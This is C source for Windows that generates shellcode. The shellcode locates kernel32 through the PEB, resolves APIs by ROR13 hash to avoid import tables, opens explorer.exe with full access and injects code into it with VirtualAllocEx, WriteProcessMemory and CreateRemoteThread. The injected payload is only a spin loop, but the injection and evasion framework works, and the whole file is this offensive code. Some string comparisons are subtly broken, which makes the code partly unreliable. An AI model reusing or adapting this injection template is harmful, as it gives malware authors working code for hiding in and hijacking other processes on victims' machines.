#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>
#include <tlhelp32.h>

PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
HMODULE __stdcall find_kernel32(void);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
HANDLE __stdcall find_process(HMODULE kern32, const char *procname);
VOID __stdcall inject_code(HMODULE kern32, HANDLE hprocess, const char *code, DWORD size);
BOOL __stdcall strmatch(const char *a, const char *b);


/*
Shell code that will be injected to a process
*/
void __stdcall shell_code()
{
	HMODULE kern32;
	DWORD *dwptr;
	HANDLE hProcess;
	char procname[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};
	char code[] = {0xEB, 0xFE};

	kern32 = find_kernel32();
	hProcess = find_process(kern32, (char *)procname);
	inject_code(kern32, hProcess, code, sizeof code);
}

/*
Find a process by hash comparison
@param kern32 - a handler to kernel32.dll
@param procname - a char[] contains the process name
@return a bar handler to the process if found. INVALID_HANDLE_VALUE otherwise.
*/
HANDLE __stdcall find_process(HMODULE kern32, const char *procname)
{
	FARPROC createtoolhelp32snapshot = find_function(kern32, 0xE454DFED);
	FARPROC process32first = find_function(kern32, 0x3249BAA7);
	FARPROC process32next = find_function(kern32, 0x4776654A);
	FARPROC openprocess = find_function(kern32, 0xEFE297C0);
	FARPROC createprocess = find_function(kern32, 0x16B3FE72);
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;

	hSnapshot = (HANDLE)createtoolhelp32snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot == INVALID_HANDLE_VALUE)
	{
		return INVALID_HANDLE_VALUE;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if(!process32first(hSnapshot, &pe32))
	{
		return INVALID_HANDLE_VALUE;
	}

	do
	{
		if(strmatch(pe32.szExeFile, procname))
		{
			return openprocess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
		}
	} while(process32next(hSnapshot, &pe32));

	return INVALID_HANDLE_VALUE;
}

/*
Compare strings
@param a - the first string
@param b - the second string
@return TRUE if strings are same. FALSE otherwise
*/
BOOL __stdcall strmatch(const char *a, const char *b)
{
	while(*a != "" && *b != "")
	{
		char aA_delta = 'a' - 'A';
		char a_conv = *a >= 'a' && *a <= 'z' ? *a - aA_delta : *a;
		char b_conv = *b >= 'a' && *b <= 'z' ? *b - aA_delta : *b;

		if(a_conv != b_conv)
			return FALSE;
		a++;
		b++;
	}

	if(*b == "" && *a == "")
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

/*
Inject code into a process
@param kern32 - a handler to kernel32.dll
@param kern32 - a handler to the target process
@param code - the code to inject into a process
@param size - the size of the code to inject into a process
*/
VOID __stdcall inject_code(HMODULE kern32, HANDLE hprocess, const char *code, DWORD size)
{
	FARPROC virtualallocex = find_function(kern32, 0x6E1A959C);
	FARPROC writeprocessmemory = find_function(kern32, 0xD83D6AA1);
	FARPROC createremotethread = find_function(kern32, 0x72BD9CDD);
	LPVOID remote_buffer;
	DWORD dwNumBytesWritten;

	remote_buffer = virtualallocex(hprocess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(remote_buffer == NULL)
	{
		return;
	}

	if(!writeprocessmemory(hprocess, remote_buffer, code, size, &dwNumBytesWritten))
	{
		return;
	}

	createremotethread(hprocess, NULL, 0, remote_buffer, NULL, 0, NULL);
}

/*
Find kernel32.dll in memory by hash
@return a handler to kernel32.dll
*/
HMODULE __stdcall find_kernel32(void)
{
	return find_module_by_hash(0x8FECD63F);
}

/*
Find a module in memory by hash comparison
@param hash - the hash of the module name
@return a handler to the precess if found. INVALID_HANDLE_VALUE otherwise
*/
HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb;
	LDR_DATA_TABLE_ENTRY *module_ptr, *first_mod;

	peb = get_peb();

	module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
	first_mod = module_ptr;

	do
	{
		if(unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
		{
			return (HMODULE)module_ptr->Reserved2[0];
		}
		else
		{
			module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
		}
	} while(module_ptr && module_ptr != first_mod);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

/*
Find the Process Environment Block (PEB)
*/
PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs:[0x30]
		ret
	}
}

/*
Calculate a ror13 hash for a unicode string 
@param unicode_string - the unicode string to calculate the hash for
@return a ror13 hash of a given string
*/
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	DWORD hash = 0;

	while(*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

/*
Calculate a ror13 hash for an ascii string
@param string - the ascii string to calculate the hash for
@return a ror13 hash of a given string
*/
DWORD __stdcall ror13_hash(const char *string)
{
	DWORD hash = 0;

	while(*string)
	{
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

/*
Find a loaded function in memory
@param module - the module to search the function in
@param hash - the hash of the function name
@return a FARPROC object of the requested function if found. NULL otherwise 
*/
FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
	IMAGE_NT_HEADERS *nt_headers;
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	int i;

	dos_header = (IMAGE_DOS_HEADER *)module;
	nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((char *)module + export_dir->AddressOfNames);
	funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
	nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);

	for(i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char *)module + names[i];
		if(hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + funcrva);
		}
	}

	return NULL;
}

// A stub to recognize the shellcode end
void __declspec(naked) END_SHELLCODE(void) {}

int main(int argc, char *argv[])
{
	FILE *output_file = fopen("shellcode.bin", "w");
	fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
	fclose(output_file);

	return 0;
}